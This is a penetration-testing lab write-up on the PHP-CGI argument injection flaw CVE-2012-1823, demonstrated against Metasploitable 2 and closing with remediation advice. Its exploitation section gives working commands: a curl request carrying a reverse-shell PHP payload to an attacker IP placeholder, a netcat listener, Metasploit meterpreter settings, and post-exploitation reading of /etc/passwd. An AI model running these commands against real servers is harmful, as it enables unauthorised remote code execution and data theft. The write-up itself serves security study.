# PHP CGI Argument Injection — CVE-2012-1823

> **Lab Environment:** Metasploitable 2 (`192.168.133.128`)
> **Research Type:** Penetration Testing / Vulnerability Analysis
> **Severity:** High (CVSS 7.5)

---

## Table of Contents

1. [What is PHP-CGI?](#what-is-php-cgi)
2. [Vulnerability Overview](#vulnerability-overview)
3. [How the Flaw Works](#how-the-flaw-works)
4. [Lab Reconnaissance](#lab-reconnaissance)
5. [Vulnerability Confirmation](#vulnerability-confirmation)
6. [Exploitation](#exploitation)
7. [Remediation](#remediation)
8. [References](#references)

---

## What is PHP-CGI?

**PHP-CGI** is an implementation of the Common Gateway Interface (CGI) for the PHP scripting language. In legacy web configurations, web servers like Apache passed requests to an **external PHP-CGI executable** rather than handling PHP via an integrated module like `mod_php`.

Request flow in CGI mode:

```
Browser → Apache → PHP-CGI Binary → Script Output → Apache → Browser
```

This architecture is the root cause of the vulnerability — because the web server forwards query string parameters directly to the CGI binary, which also accepts command-line switches.

---

## Vulnerability Overview

| Field | Detail |
|---|---|
| CVE | CVE-2012-1823 (bypass: CVE-2012-2311) |
| Affected Versions | PHP < 5.3.12 and PHP < 5.4.2 (CGI mode) |
| Attack Type | Argument Injection → Remote Code Execution (RCE) |
| CVSS Score | 7.5 (High) |
| Requires Auth | No |

### The Core Flaw

If a query string **does not contain an unescaped `=` sign**, the PHP-CGI binary treats the query string as a **command-line argument** rather than a URL parameter. This allows an attacker to inject PHP interpreter flags directly via the URL.

---

## How the Flaw Works

### 1. Source Code Disclosure (`-s` flag)

Appending `?-s` to a PHP file URL causes the binary to output the raw source code instead of executing it:

```
http://<target>/phpinfo.php?-s
```

Normal response → formatted HTML page.
Vulnerable response → raw PHP source code displayed in browser.

### 2. Remote Code Execution (`-d` flag)

The `-d` flag overrides `php.ini` directives at runtime. An attacker can chain two directives to execute arbitrary code from the POST body:

- `allow_url_include=on` — permits stream-based file inclusion
- `auto_prepend_file=php://input` — executes the raw POST body as PHP before the script runs

**Conceptual HTTP request:**

```http
POST /index.php?-d+allow_url_include%3don+-d+auto_prepend_file%3dphp%3a//input HTTP/1.1
Host: <target-ip>
Content-Length: 36

<?php system('whoami'); die(); ?>
```

---

## Lab Reconnaissance

### Step 1 — Nmap Service Scan

```bash
nmap -sV 192.168.133.128
```

**Result:**

```
80/tcp   open  http    Apache httpd 2.2.8 ((Ubuntu) DAV/2)
```

Apache 2.2.8 on Ubuntu — severely outdated. PHP version not immediately visible from this output alone.

### Step 2 — Nikto Web Scan

```bash
nikto -h http://192.168.133.128
```

**Key findings from Nikto:**

| Finding | Significance |
|---|---|
| PHP/5.2.4 detected | Far below patched threshold (5.3.12 / 5.4.2) |
| Apache/2.2.8 | Legacy, unpatched server |
| `/phpinfo.php` exposed | Reveals full server configuration |
| `/phpMyAdmin/` found | Additional high-value attack surface |
| Directory indexing on `/icons/`, `/doc/` | Information disclosure |
| HTTP TRACE enabled | Potential Cross-Site Tracing (XST) |
| PHP Easter Eggs triggered | Confirms query strings reach PHP engine directly |

### Step 3 — Confirm CGI Mode via phpinfo

Visiting `/phpinfo.php` and checking the **Server API** field:

```
http://192.168.133.128/phpinfo.php
```

**Result:** `Server API: CGI/FastCGI`

This is the critical confirmation. CGI/FastCGI mode + PHP 5.2.4 = vulnerable to CVE-2012-1823.

---

## Vulnerability Confirmation

### Safe Proof-of-Concept — Source Disclosure Test

```
http://192.168.133.128/phpinfo.php?-s
```

**Expected (secure):** Purple/blue PHP configuration tables rendered as HTML.

**Actual (vulnerable):** Raw PHP source code returned:

```php
<?php
phpinfo()
?>
```

The server passed `-s` directly to the PHP binary, which interpreted it as the "show source" flag instead of executing the script.

### Version Injection Test

```
http://192.168.133.128/phpinfo.php?-v
```

Returns plain-text PHP version output — identical to running `php -v` in a terminal — confirming the argument injection path is fully open.

---

## Exploitation

### Manual Exploitation

**1. Start a listener:**

```bash
nc -lvnp 4444
```

**2. Send the payload via curl:**

```bash
curl -d "<?php system('bash -i >& /dev/tcp/<your-ip>/4444 0>&1'); ?>" \
  "http://192.168.133.128/index.php?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input"
```

### Metasploit Exploitation

```bash
msfconsole
```

```
use exploit/multi/http/php_cgi_arg_injection

set RHOSTS 192.168.133.128
set RPORT 80
set TARGETURI /index.php
set PAYLOAD php/meterpreter/reverse_tcp
set LHOST <your-ip>
set LPORT 4444

check   # verify vulnerability before firing
run
```

**Post-exploitation:**

```
meterpreter > sysinfo
meterpreter > getuid
meterpreter > shell
$ whoami
$ cat /etc/passwd
```

---

## Remediation

| Fix | Description |
|---|---|
| **Update PHP** | Patch to PHP ≥ 5.3.12 or ≥ 5.4.2 |
| **Migrate to PHP-FPM** | Modern FastCGI Process Manager eliminates this attack vector entirely |
| **mod_rewrite filter** | Block query strings starting with `-` before they reach the CGI binary |
| **Disable phpinfo.php** | Remove or restrict access to information disclosure scripts in production |
| **Disable HTTP TRACE** | Add `TraceEnable Off` to Apache config |
| **Restrict directory indexing** | Use `Options -Indexes` in Apache config |

---

## References

- [CVE-2012-1823 — NVD](https://nvd.nist.gov/vuln/detail/CVE-2012-1823)
- [CVE-2012-2311 — NVD](https://nvd.nist.gov/vuln/detail/CVE-2012-2311)
- [PHP Bug #61910](https://bugs.php.net/bug.php?id=61910)
- [Metasploit Module — php_cgi_arg_injection](https://www.rapid7.com/db/modules/exploit/multi/http/php_cgi_arg_injection/)

---

> **Disclaimer:** This research was conducted entirely within a private, isolated lab environment using Metasploitable 2, a legally distributed intentionally vulnerable virtual machine. All techniques documented here are for educational purposes only. Never test against systems without explicit written permission.
